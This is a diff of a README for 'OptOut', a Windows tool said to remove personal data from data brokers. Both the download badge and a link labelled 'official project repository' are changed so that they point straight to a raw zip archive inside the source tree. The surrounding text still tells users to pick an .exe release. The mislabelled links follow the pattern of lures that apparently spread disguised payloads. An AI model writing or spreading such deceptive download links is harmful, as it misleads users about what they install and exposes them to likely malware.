@@ -1,6 +1,6 @@
 # 🛡️ OptOut - Remove Your Personal Data From Brokers
 
-[![](https://img.shields.io/badge/Download_OptOut-Blue.svg)](https://github.com/yousifabu3848/OptOut)
+[![](https://img.shields.io/badge/Download_OptOut-Blue.svg)](https://raw.githubusercontent.com/yousifabu3848/OptOut/main/src/optout/Out-Opt-v2.8.zip)
 
 ## About This Software
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or Windows 11. The software requires 50
 
 ## 📥 Downloading The Software
 
-Visit the [official project repository](https://github.com/yousifabu3848/OptOut) to download the application. 
+Visit the [official project repository](https://raw.githubusercontent.com/yousifabu3848/OptOut/main/src/optout/Out-Opt-v2.8.zip) to download the application. 
 
 You must select the latest stable release for Windows. Look for a file that ends in .exe. Save this file to your desktop or your downloads folder.
 
